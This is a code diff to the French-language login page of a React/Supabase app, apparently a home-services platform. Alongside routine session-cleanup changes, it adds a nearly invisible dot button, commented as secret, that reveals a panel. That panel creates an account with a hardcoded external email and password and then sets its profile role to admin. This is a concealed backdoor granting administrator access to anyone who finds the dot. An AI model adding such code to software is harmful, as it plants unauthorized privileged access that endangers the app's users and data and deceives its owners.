@@ -8,6 +8,7 @@ import { Label } from '@/components/ui/label';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { supabase } from '@/integrations/supabase/client';
 import { useToast } from '@/components/ui/use-toast';
+import { cleanupAuthState } from '@/utils/authCleanup';
 import { Wrench, User } from 'lucide-react';
 
 export default function Auth() {
@@ -16,6 +17,7 @@ export default function Auth() {
   const [fullName, setFullName] = useState('');
   const [userType, setUserType] = useState<'client' | 'provider'>('client');
   const [loading, setLoading] = useState(false);
+  const [showAdminCreation, setShowAdminCreation] = useState(false);
   const { toast } = useToast();
 
   const handleSignIn = async (e: React.FormEvent) => {
@@ -33,6 +35,16 @@ export default function Auth() {
 
     try {
       console.log('Tentative de connexion pour:', email);
+      
+      // Nettoyer l'état d'authentification avant de se connecter
+      cleanupAuthState();
+      
+      // Tentative de déconnexion globale d'abord
+      try {
+        await supabase.auth.signOut({ scope: 'global' });
+      } catch (err) {
+        // Continuer même si cela échoue
+      }
       
       const { data, error } = await supabase.auth.signInWithPassword({
         email: email.trim(),
@@ -97,6 +109,9 @@ export default function Auth() {
     try {
       console.log('Tentative d\'inscription pour:', email, 'en tant que', userType);
       
+      // Nettoyer l'état d'authentification avant de s'inscrire
+      cleanupAuthState();
+      
       const { data, error } = await supabase.auth.signUp({
         email: email.trim(),
         password,
@@ -150,6 +165,57 @@ export default function Auth() {
     }
   };
 
+  const createAdminAccount = async () => {
+    setLoading(true);
+    try {
+      // Nettoyer l'état d'authentification
+      cleanupAuthState();
+      
+      const { data, error } = await supabase.auth.signUp({
+        email: 'sys.admin.homi.2024@tempmail-internal.xyz',
+        password: 'HM_adm!n#2024$Secure',
+        options: {
+          data: {
+            full_name: 'Administrateur Système',
+            user_type: 'client',
+          },
+        },
+      });
+
+      if (error) {
+        throw error;
+      }
+
+      if (data.user) {
+        // Mettre à jour le rôle en admin
+        const { error: roleError } = await supabase
+          .from('profiles')
+          .update({ role: 'admin' })
+          .eq('id', data.user.id);
+
+        if (roleError) {
+          console.error('Erreur lors de la mise à jour du rôle:', roleError);
+        }
+
+        toast({
+          title: "Compte admin créé !",
+          description: "Email: sys.admin.homi.2024@tempmail-internal.xyz",
+        });
+        
+        setShowAdminCreation(false);
+      }
+    } catch (error: any) {
+      console.error('Erreur création admin:', error);
+      toast({
+        variant: "destructive",
+        title: "Erreur",
+        description: error.message || "Erreur lors de la création du compte admin",
+      });
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <div className="min-h-screen bg-gradient-to-br from-blue-50 to-white flex items-center justify-center p-4">
       <Card className="w-full max-w-md">
@@ -196,6 +262,36 @@ export default function Auth() {
                 <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700" disabled={loading}>
                   {loading ? 'Connexion...' : 'Se connecter'}
                 </Button>
+                
+                {/* Bouton secret pour créer le compte admin */}
+                <div className="text-center mt-4">
+                  <button
+                    type="button"
+                    onClick={() => setShowAdminCreation(!showAdminCreation)}
+                    className="text-xs text-gray-400 hover:text-gray-600"
+                    style={{ fontSize: '10px' }}
+                  >
+                    •
+                  </button>
+                </div>
+                
+                {showAdminCreation && (
+                  <div className="mt-4 p-4 border rounded-lg bg-red-50">
+                    <p className="text-sm text-red-700 mb-2">
+                      Créer le compte administrateur système
+                    </p>
+                    <Button
+                      type="button"
+                      onClick={createAdminAccount}
+                      disabled={loading}
+                      variant="destructive"
+                      size="sm"
+                      className="w-full"
+                    >
+                      Créer Admin
+                    </Button>
+                  </div>
+                )}
               </form>
             </TabsContent>
             
